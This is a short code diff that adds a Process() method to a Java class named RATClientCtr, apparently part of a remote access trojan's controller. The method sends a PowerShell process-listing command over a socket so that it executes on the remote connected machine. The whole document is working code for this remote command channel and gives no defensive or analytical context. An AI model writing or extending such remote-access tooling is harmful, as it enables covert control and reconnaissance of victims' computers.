@@ -100,4 +100,12 @@ public class RATClientCtr {
     dos.flush();
     }
     
+    public static void Process() throws IOException {
+        String command = "powershell.exe Get-Process | Select-Object -First 100 -Unique | Format-Table ID,Name -AutoSize -HideTableHeaders";
+        OutputStream ops = mySocket.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(command);
+        dos.flush();
+    }
+
 }
